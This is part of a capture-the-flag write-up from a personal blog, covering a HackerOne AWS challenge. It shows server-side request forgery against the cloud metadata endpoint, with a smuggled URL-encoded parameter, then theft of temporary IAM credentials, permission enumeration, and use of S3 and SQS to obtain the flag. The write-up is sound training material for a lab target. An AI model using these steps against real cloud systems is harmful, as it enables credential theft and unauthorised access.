<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8dGl0bGU+U0VSVklDRSBIRUFMVEggTU9OSVRPUjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgLm9rIHsKICAgICAgICAgICAgY29sb3I6IGdyZWVuOwogICAgICAgIH0KICAgICAgICAuZXJyIHsKICAgICAgICAgICAgY29sb3I6IHJlZDsKICAgICAgICB9CiAgICA8L3N0eWxlPgogICAgPHNjcmlwdD5hcGlfa2V5ID0gImhYallzcE9yNDA2ZG45M3VLR21zQ29kTkpnM2Myb1FNIjs8L3NjcmlwdD4KPC9oZWFkPgo8Ym9keT4KICAgIDxoMT5NQUNISU5FIFNUQVRVUzwvaDE+CiAgICA8dGFibGUgaWQ9InN0YXR1c190YWJsZSI+CiAgICAgICAgPHRyPgogICAgICAgICAgICA8dGg+QUREUjwvdGg+CiAgICAgICAgICAgIDx0aD5TVEFUVVM8L3RoPgogICAgICAgIDwvdHI+CiAgICA8L3RhYmxlPgo8L2JvZHk+CjxzY3JpcHQgc3JjPSIvc3RhdGljL21haW4uanMiPjwvc2NyaXB0Pgo8L2h0bWw+"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
&lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;title&gt;SERVICE HEALTH MONITOR&lt;/title&gt;
    &lt;style&gt;
        .ok <span class="o">{</span>
            color: green<span class="p">;</span>
        <span class="o">}</span>
        .err <span class="o">{</span>
            color: red<span class="p">;</span>
        <span class="o">}</span>
    &lt;/style&gt;
    &lt;script&gt;api_key <span class="o">=</span> <span class="s2">"hXjYspOr406dn93uKGmsCodNJg3c2oQM"</span><span class="p">;</span>&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;MACHINE STATUS&lt;/h1&gt;
    &lt;table <span class="nb">id</span><span class="o">=</span><span class="s2">"status_table"</span><span class="o">&gt;</span>
        &lt;<span class="nb">tr</span><span class="o">&gt;</span>
            &lt;th&gt;ADDR&lt;/th&gt;
            &lt;th&gt;STATUS&lt;/th&gt;
        &lt;/tr&gt;
    &lt;/table&gt;
&lt;/body&gt;
&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"/static/main.js"</span><span class="o">&gt;</span>&lt;/script&gt;
&lt;/html&gt; 
</pre></td>
</tr></tbody></table></code></div></div>
<p>Modifying the URL a little, we can fetch the contents of <code class="language-plaintext highlighter-rouge">main.js</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone10.png" alt=""></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td>
<td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">fetch_machines</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">authenticated_fetch</span><span class="p">(</span><span class="s2">`/api/get_machines`</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fetch_system_status</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">authenticated_fetch</span><span class="p">(</span><span class="s2">`/api/get_status?addr=</span><span class="p">${</span><span class="nx">addr</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">authenticated_fetch</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">separator</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">?</span><span class="dl">"</span><span class="p">)</span> <span class="p">?</span> <span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">?</span><span class="dl">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">addr</span><span class="p">}${</span><span class="nx">separator</span><span class="p">}</span><span class="s2">api_key=</span><span class="p">${</span><span class="nx">api_key</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">fetch_machines</span><span class="p">().</span><span class="nx">then</span><span class="p">((</span><span class="nx">result</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">result</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">((</span><span class="nx">machine_addrs</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">machine_addrs</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">addr</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">fetch_system_status</span><span class="p">(</span><span class="nx">addr</span><span class="p">).</span><span class="nx">then</span><span class="p">((</span><span class="nx">result</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">result</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">status_table</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">status_table</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">let</span> <span class="nx">status_row</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">tr</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">let</span> <span class="nx">machine_addr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">td</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">machine_addr</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">;</span>
            <span class="kd">let</span> <span class="nx">machine_status</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">td</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">machine_status</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="dl">"</span><span class="s2">success</span><span class="dl">"</span><span class="p">]</span> <span class="p">?</span> <span class="dl">"</span><span class="s2">OK</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">UNREACHABLE</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">machine_status</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="dl">"</span><span class="s2">success</span><span class="dl">"</span><span class="p">]</span> <span class="p">?</span> <span class="dl">"</span><span class="s2">ok</span><span class="dl">"</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">err</span><span class="dl">"</span><span class="p">;</span>
            <span class="nx">status_row</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">machine_addr</span><span class="p">);</span>
            <span class="nx">status_row</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">machine_status</span><span class="p">);</span>
            <span class="nx">status_table</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">status_row</span><span class="p">);</span>
        <span class="p">})</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></td>
</tr></tbody></table></code></div></div>
<p>It seems that there are 2 other endpoints on <code class="language-plaintext highlighter-rouge">http://10.0.0.55</code>, <code class="language-plaintext highlighter-rouge">/api/get_machines</code> and <code class="language-plaintext highlighter-rouge">/api/get_status?addr=${addr}</code>.</p>
<p>Unfortunately, fetching <code class="language-plaintext highlighter-rouge">/api/get_machines</code> returned a <code class="language-plaintext highlighter-rouge">500 Internal Server Error</code>, so lets try to figure out how to use <code class="language-plaintext highlighter-rouge">/api/get_status?addr=${addr}</code>.</p>
<p>Based on <code class="language-plaintext highlighter-rouge">main.js</code>, fetching <code class="language-plaintext highlighter-rouge">http://10.0.0.55/api/get_status?addr=169.254.169.254&amp;api_key=hXjYspOr406dn93uKGmsCodNJg3c2oQM</code> should work but unfortunately it reported <code class="language-plaintext highlighter-rouge">Missing api_key parameter. See AWS SecretsManager.</code> even though we specified it. I then figured out that we needed to URL encode the <code class="language-plaintext highlighter-rouge">&amp;</code> to <code class="language-plaintext highlighter-rouge">%26</code> for it to work. Therefore, the resulting URL we fetch is <code class="language-plaintext highlighter-rouge">http://10.0.0.55/api/get_status?addr=169.254.169.254%26api_key=hXjYspOr406dn93uKGmsCodNJg3c2oQM</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone11.png" alt=""></p>
<h1 id="generating-temporary-credentials-2">Generating temporary credentials (2)</h1>
<p>Similar to before, we can view the roles available by fetching <code class="language-plaintext highlighter-rouge">http://10.0.0.55/api/get_status?addr=169.254.169.254/latest/meta-data/iam/security-credentials/%26api_key=hXjYspOr406dn93uKGmsCodNJg3c2oQM</code>.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone12.png" alt=""></p>
<p>We then generate a new set of temporary credentials by appending <code class="language-plaintext highlighter-rouge">SSRFChallengeTwoRole</code> to the <code class="language-plaintext highlighter-rouge">addr</code> parameter.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone13.png" alt=""></p>
<h1 id="using-the-temporary-credentials-2">Using the temporary credentials (2)</h1>
<p>Lets reconfigure the <code class="language-plaintext highlighter-rouge">aws</code> CLI by exporting certain variables while specifying the new <code class="language-plaintext highlighter-rouge">AccessKeyId</code>, <code class="language-plaintext highlighter-rouge">SecretAccessKey</code> and <code class="language-plaintext highlighter-rouge">Token</code> values we just retrieved.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td>
<td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>&lt;REDACTED&gt;
<span class="nb">export </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>&lt;REDACTED&gt;
<span class="nb">export </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>&lt;REDACTED&gt;
</pre></td>
</tr></tbody></table></code></div></div>
<p>To verify the credentials, we can run <code class="language-plaintext highlighter-rouge">aws sts get-caller-identity</code> again.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws sts get-caller-identity                                               
<span class="o">{</span>
    <span class="s2">"UserId"</span>: <span class="s2">"AROASCLNOVA3RDNOS7QB2:i-04e8c92684401cee9"</span>,
    <span class="s2">"Account"</span>: <span class="s2">"142500341815"</span>,
    <span class="s2">"Arn"</span>: <span class="s2">"arn:aws:sts::142500341815:assumed-role/SSRFChallengeTwoRole/i-04e8c92684401cee9"</span>
<span class="o">}</span>
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="enumerating-api-calls-2">Enumerating API Calls (2)</h1>
<p>We run <code class="language-plaintext highlighter-rouge">enumerate-iam</code> again to see what we can do with these new credentials.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>python3 enumerate-iam.py <span class="nt">--access-key</span> <span class="nv">$AWS_ACCESS_KEY_ID</span> <span class="nt">--secret-key</span> <span class="nv">$AWS_SECRET_ACCESS_KEY</span> <span class="nt">--session-token</span> <span class="nv">$AWS_SESSION_TOKEN</span>
2021-04-11 14:46:14,816 - 3145 - <span class="o">[</span>INFO] Starting permission enumeration <span class="k">for </span>access-key-id <span class="s2">"&lt;REDACTED&gt;"</span>
2021-04-11 14:46:16,837 - 3145 - <span class="o">[</span>INFO] <span class="nt">--</span> Account ARN : arn:aws:sts::142500341815:assumed-role/SSRFChallengeTwoRole/i-04e8c92684401cee9
2021-04-11 14:46:16,837 - 3145 - <span class="o">[</span>INFO] <span class="nt">--</span> Account Id  : 142500341815
2021-04-11 14:46:16,837 - 3145 - <span class="o">[</span>INFO] <span class="nt">--</span> Account Path: assumed-role/SSRFChallengeTwoRole/i-04e8c92684401cee9
2021-04-11 14:46:19,937 - 3145 - <span class="o">[</span>INFO] Attempting common-service describe / list brute force.
2021-04-11 14:46:20,041 - 3145 - <span class="o">[</span>ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2021-04-11 14:46:38,503 - 3145 - <span class="o">[</span>INFO] <span class="nt">--</span> s3.list_buckets<span class="o">()</span> worked!
2021-04-11 14:46:38,587 - 3145 - <span class="o">[</span>INFO] <span class="nt">--</span> secretsmanager.list_secrets<span class="o">()</span> worked!
2021-04-11 14:46:40,607 - 3145 - <span class="o">[</span>INFO] <span class="nt">--</span> sts.get_caller_identity<span class="o">()</span> worked!
2021-04-11 14:46:45,907 - 3145 - <span class="o">[</span>INFO] <span class="nt">--</span> dynamodb.describe_endpoints<span class="o">()</span> worked!
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="using-s3list_buckets">Using <code class="language-plaintext highlighter-rouge">s3.list_buckets()</code>
</h1>
<p>Lets list the <code class="language-plaintext highlighter-rouge">s3</code> buckets that we have access to.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">ls  
</span>2021-03-17 10:04:26 h101-dev-notes
2021-03-17 10:03:20 h101-flag-files
2021-03-16 16:22:02 h101ctfloadbalancerlogs
</pre></td>
</tr></tbody></table></code></div></div>
<p>Out of these buckets, we can only list the files in <code class="language-plaintext highlighter-rouge">h101-dev-notes</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://h101-dev-notes                           
2021-03-17 10:05:46        731 README.md
</pre></td>
</tr></tbody></table></code></div></div>
<p>Lets retrieve <code class="language-plaintext highlighter-rouge">README.md</code> and read it.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://h101-dev-notes/README.md <span class="nb">.</span> 
download: s3://h101-dev-notes/README.md to ./README.md 
<span class="nv">$ </span><span class="nb">cat </span>README.md
<span class="c"># Flag Generation</span>
This document outlines the steps required to generate a flag file.

<span class="c">## Steps</span>
1. Fetch your <span class="sb">`</span>hid<span class="sb">`</span> and <span class="sb">`</span>fid<span class="sb">`</span> values from the  <span class="sb">`</span>/api/_internal/87tbv6rg6hojn9n7h9t/get_hid<span class="sb">`</span> endpoint.
2. Send a message to the SQS queue <span class="sb">`</span>flag_file_generator<span class="sb">`</span> with the following format
    <span class="sb">```</span>json
    <span class="o">{</span><span class="s2">"fid"</span>: <span class="s2">"&lt;fid&gt;"</span>, <span class="s2">"hid"</span>: <span class="s2">"&lt;hid&gt;"</span><span class="o">}</span>
    <span class="sb">```</span>
    where <span class="sb">`</span>&lt;fid&gt;<span class="sb">`</span> and <span class="sb">`</span>&lt;hid&gt;<span class="sb">`</span> are the values you received <span class="k">in </span>step 1.
3. Get the <span class="sb">`</span>&lt;fid&gt;.flag<span class="sb">`</span> file from the <span class="sb">`</span>flag-files<span class="sb">`</span> <span class="o">(</span>name may be slightly different<span class="o">)</span> S3 bucket.

<span class="c">## Tips</span>

If you<span class="s1">'ve never worked with SQS (Simple Queue Service) before then the [following link](https://docs.aws.amazon.com/cli/latest/reference/sqs/send-message.html)
may be helpful in sending messages from the aws cli tool.
</span></pre></td>
</tr></tbody></table></code></div></div>
<h1 id="generating-hid-and-fid-values">Generating <code class="language-plaintext highlighter-rouge">hid</code> and <code class="language-plaintext highlighter-rouge">fid</code> values</h1>
<p>We just need to fetch <code class="language-plaintext highlighter-rouge">/api/_internal/87tbv6rg6hojn9n7h9t/get_hid</code>, which results in the URL that we want to query to be: <code class="language-plaintext highlighter-rouge">http://10.0.0.55/api/_internal/87tbv6rg6hojn9n7h9t/get_hid?api_key=hXjYspOr406dn93uKGmsCodNJg3c2oQM</code></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/awshackerone14.png" alt=""></p>
<p>Save the <code class="language-plaintext highlighter-rouge">JSON</code> output into a file called <code class="language-plaintext highlighter-rouge">send-message.json</code>.</p>
<h1 id="sending-a-message-to-the-flag_file_generator-sqs-queue">Sending a message to the <code class="language-plaintext highlighter-rouge">flag_file_generator</code> SQS queue</h1>
<p>First, we will need the URL of the queue which we can retrieve by running this command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws sqs get-queue-url <span class="nt">--queue-name</span> flag_file_generator 
<span class="o">{</span>
    <span class="s2">"QueueUrl"</span>: <span class="s2">"https://sqs.us-west-2.amazonaws.com/142500341815/flag_file_generator"</span>
<span class="o">}</span>
</pre></td>
</tr></tbody></table></code></div></div>
<p>We then simply send the message while specifying the <code class="language-plaintext highlighter-rouge">send-message.json</code> as our body.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws sqs send-message <span class="nt">--queue-url</span> https://sqs.us-west-2.amazonaws.com/142500341815/flag_file_generator <span class="nt">--message-body</span>  file://send-message.json
<span class="o">{</span>
    <span class="s2">"MD5OfMessageBody"</span>: <span class="s2">"8047ff8363ab0f2da57d96e8355b4382"</span>,
    <span class="s2">"MessageId"</span>: <span class="s2">"f18b8f3e-dfb3-4c27-9c86-d5d0de20dafb"</span>
<span class="o">}</span>
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="getting-the-flag">Getting the flag</h1>
<p>The <code class="language-plaintext highlighter-rouge">README.md</code> specified that the flag file would be called <code class="language-plaintext highlighter-rouge">&lt;fid&gt;.flag</code> and is located in another <code class="language-plaintext highlighter-rouge">s3</code> bucket called <code class="language-plaintext highlighter-rouge">h101-flag-files</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">cp </span>s3://h101-flag-files/82aaf095-9ffc-4a35-91a9-bbb8975a41fc.flag flag.txt
download: s3://h101-flag-files/82aaf095-9ffc-4a35-91a9-bbb8975a41fc.flag to ./flag.txt
</pre></td>
</tr></tbody></table></code></div></div>
<p>Copy the contents of the flag file and submit it to your personalised submission URL and you will rewarded be with another flag which you can submit on the Hacker101 website to gain the 26 points.</p>
</div>
<div class="post-tail-wrapper text-muted">
<div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href="/categories/ctf/">ctf</a>
</div>
<div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cloud/" class="post-tag no-text-decoration">cloud</a> <a href="/tags/aws/" class="post-tag no-text-decoration">aws</a>
</div>
<div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
<div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div>
<div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=AWS%20Capture%20the%20Flag%20by%20HackerOne%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/awshackerone-ctf/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=AWS%20Capture%20the%20Flag%20by%20HackerOne%20-%20rizemon's%20blog&amp;u=https://rizemon.github.io/posts/awshackerone-ctf/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=AWS%20Capture%20the%20Flag%20by%20HackerOne%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/awshackerone-ctf/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span>
</div>
</div>
</div>
</div></div>
<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access">
<div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2">
<li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a></li>
<li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a></li>
<li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a></li>
<li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a></li>
<li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></li>
</ul>
</div>
<div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
</div>
</div>
</div></div>
</div>
<div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
<div id="related-posts" class="mt-5 mb-2 mb-sm-4">
<h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
<div class="card-deck mb-4">
<div class="card"> <a href="/posts/stacktheflag2020-ctf/"><div class="card-body"> <span class="timeago small"> Dec 7, 2020 <i class="unloaded">2020-12-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>STACK the Flags CTF 2020 by Govtech CSG</h3>
<div class="text-muted small"><p> Participated in the STACK the Flags CTF with my peers and placed 10th in the University / Polytechnic category. Here’s the link to the writeup. I mostly solved the cloud, osint and social enginee...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small"> Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3>
<div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/dsonus2021-protectthevaccine-ctf/"><div class="card-body"> <span class="timeago small"> Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Protect The Vaccine</h3>
<div class="text-muted small"><p> Description A nation-supported hacker group is using their cutting edge technology to attack a company that develops vaccine. They roll their own crypto with a hope that it will be more secure....</p></div>
</div></a>
</div>
</div>
</div>
<div class="post-navigation d-flex justify-content-between"> <a href="/posts/bankrobber-htb/" class="btn btn-outline-primary"><p>Hack The Box - Bankrobber (Without Metasploit)</p></a> <a href="/posts/oscp-reflection/" class="btn btn-outline-primary"><p>Post-OSCP Writeup</p></a>
</div>
</div></div></div>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center">
<div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div>
<div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div>
</div></footer>
</div>
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content">
<div id="search-hints">
<h4 class="text-muted mb-4">Trending Tags</h4>
<a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
</div>
<div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
</div></div>
</div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
